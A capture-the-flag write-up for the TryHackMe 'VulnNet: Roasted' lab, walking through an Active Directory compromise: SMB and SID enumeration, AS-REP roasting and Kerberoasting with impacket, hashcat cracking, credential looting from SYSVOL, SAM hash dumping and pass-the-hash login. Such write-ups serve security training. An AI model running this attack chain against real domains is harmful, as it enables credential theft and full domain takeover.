# VulnNet : Roasted

Link to the room: https://tryhackme.com/room/vulnnetroasted

## Let's go!

Setting the IP variable. 

```
export IP=10.10.161.148
```

## Enumeration 

### Nmap scan 

```
nmap -p53,135,139,88,389,445,464,593,636,3268,3269,5985,9389,49676,49696,49674,49675,49667,49666 -sV -sC -T4 -Pn -oA 10.10.161.148 10.10.161.148
```

```
53/tcp    open     domain        Simple DNS Plus
88/tcp    filtered kerberos-sec
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   filtered ldapssl
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     tcpwrapped
9389/tcp  filtered adws
49666/tcp open     tcpwrapped
49667/tcp open     tcpwrapped
49674/tcp open     tcpwrapped
49675/tcp open     tcpwrapped
49676/tcp open     tcpwrapped
49696/tcp open     tcpwrapped

Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enum4linux

```
enum4linux $IP 
```

This doesn't yield any results, it looks like we'll have to use some other tool.

### Smbmap 

```
smbmap -H $IP -u anonymous 
```

```
[+] Guest session       IP: 10.10.161.148:445   Name: 10.10.161.148                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```

Read Only IPC$ signifies that we can enumerate usernames. Let's use impacket for this task.

### Impacket username enumeration

```
python3 /opt/impacket/examples/lookupsid.py anonymous@$IP 
```

```
[*] Brute forcing SIDs at 10.10.161.148
[*] StringBinding ncacn_np:10.10.161.148[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

Let's clean up the SidTypeUsers and add them to a user.txt

## Extracting Users

```
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

## Retrieving hashes using ASREPRoast

This attack looks for users without Kerberos pre-authentication required attribute.

```
python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip $IP
```

```
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:[REDACTED]

[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Let's add it to hash.txt

### Identifying the hash

For this task, we can use the name-the-hash tool by our very own bee-san!

```
name-that-hash -f hash.txt
```

```
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    
Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active 
Directory
```

### Cracking the hash

We'll be using hashcat for this.

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
```

```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$t-skid@VULNNET-RST:[REDACTED]
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST:6a409957813c6af504...500e39
Time.Started.....: Sat May 15 08:44:43 2021 (9 secs)
Time.Estimated...: Sat May 15 08:44:52 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   402.1 kH/s (6.82ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3178496/14344385 (22.16%)
Rejected.........: 0/3178496 (0.00%)
Restore.Point....: 3170304/14344385 (22.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: tkwyr9nrj8 -> tj030499

Started: Sat May 15 08:44:39 2021
Stopped: Sat May 15 08:44:53 2021
```

Note that the following credentials were for Remote IPC. Let's use these to Kerberoast and obtain credentials for the other services that are running.

### Keberoasting 

```
python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:*********' -outputfile keberoast.hash -dc-ip $IP
```

```
ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528
```

### Identifying and cracking the hash

```
Most Likely 
Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Active Directory.
```

```
hashcat -m 13100 keberoast.hash /usr/share/wordlists/rockyou.txt
```

```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$[REDACTED]
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$V...366aeb
Time.Started.....: Sat May 15 09:07:13 2021 (10 secs)
Time.Estimated...: Sat May 15 09:07:23 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   395.9 kH/s (6.41ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4112384/14344385 (28.67%)
Rejected.........: 0/4112384 (0.00%)
Restore.Point....: 4104192/14344385 (28.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ryannb<3 -> rutie12

Started: Sat May 15 09:07:02 2021
Stopped: Sat May 15 09:07:24 2021
```

## Logging in 

Now that we have successfully obtained the credentials, we can log in and retrieve the first flag. (Note that I was unable to log in and had to restart the machine, so I have a new IP address assigned to me for the room)

```
evil-winrm -u 'enterprise-core-vn' -p '***************' -i $IP
```

After this, we won't find much here. We'll have to start the process of enumerating SMB with the current login and go from there.

## Enumerating

```
smbmap -H $IP -u 'enterprise-core-vn' -p '***************'
```

```
[+] IP: 10.10.248.134:445       Name: 10.10.248.134                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

We have a new share that we can access. Let's log into it and see if there's anything useful.

### SYSVOL share

```
smbclient //$IP/SYSVOL --user=enterprise-core-vn%*************** 
```

```
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
```

```
strUserNTName = "a-whitehat"
strPassword = "***************"
```

We have obtained credentials for the user a-whitehat. Let's enumerate SMB once again using these credentials.

## Enumerating

```
smbmap -H $IP -u 'a-whitehat' -p '***************'
```

```
[+] IP: 10.10.248.134:445       Name: 10.10.248.134                                     
[\] Work[!] Unable to remove test directory at \\10.10.248.134\SYSVOL\GWQIVRLEAJ, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        SYSVOL                                                  READ, WRITE     Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

Great! We can see that this user has write access to SMB as the administrator. Let's dump the hashes for this user.

### Hash Dump

```
python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:***************@$IP
```

```
*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
```

### Logging in as Root

```
evil-winrm -i $IP -u Administrator -H [REDACTED]  
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
```

Now we can get the system flag!
